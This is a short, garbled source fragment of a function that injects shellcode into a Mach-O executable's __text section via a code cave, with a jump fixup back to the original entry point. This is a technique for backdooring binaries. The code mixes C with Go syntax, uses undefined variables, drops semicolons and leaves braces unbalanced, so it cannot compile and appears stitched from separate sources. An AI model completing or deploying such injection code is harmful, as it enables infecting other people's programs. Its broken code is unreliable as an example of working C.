int binject_MACH-O(char *file,char *shellcode)
{
   uint32_t size;
   FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
   size=ftell(f);
   char *file_buffer = calloc(1,size);
	shellcodefixed = ApplySuffixJmpIntel64(shellcodeBytes, uint32(caveOffset), uint32(machoFile.EntryPoint), machoFile.ByteOrder)
				scfixedlen=strlen(shellcodefixed);
	caveOffset= 0x20;
			caveOffset+=machoFile.FileHeader.Cmdsz
				for(i=0;i<ncommands;i++)
				{
					load_command *cmd=(struct load_command*)address;
    for(i=0;i<sections;i++)
  {
     if (loadCommand->cmd == LC_SEGMENT)
        {
            struct segment_command *segmentCommand = (struct segment_command*)address;
            if (strncmp(segmentCommand->segname, "__TEXT", 16) == 0)
            {
                // address of the first section
                uint8_t *sectionAddress = address + sizeof(struct segment_command);
                struct section *sectionCommand = NULL; 
                // iterate thru all sections
                for (uint32_t x = 0; x < segmentCommand->nsects; x++)
                {
                    sectionCommand = (struct section*)(sectionAddress);
                    if (strncmp(sectionCommand->sectname, "__text", 16) == 0)
                    {
                        // retrieve the offset for this section
                        targetInfo->textOffset  = sectionCommand->offset;
                        targetInfo->textAddress = sectionCommand->addr;
                        targetInfo->textSize    = sectionCommand->size;
                    }
                    sectionAddress += sizeof(struct section);
                }
            }
        }
                       for _, section := range machoFile.Sections {
		if (strstr(section.SectionHeader.Seg,"__TEXT") && strstr(section.Name,"__text")) {
			
			
			
			if(scfixedlen<section.Offset-caveOffset)
			{
				memcpy(buf+cave_offset,shellcodefixed,strlen(shellcodefixed);
			break;
				       }
		}
	}
 
  }
				       address+=cmd->cmdsize
				       }                
  free(file_buffer);
}
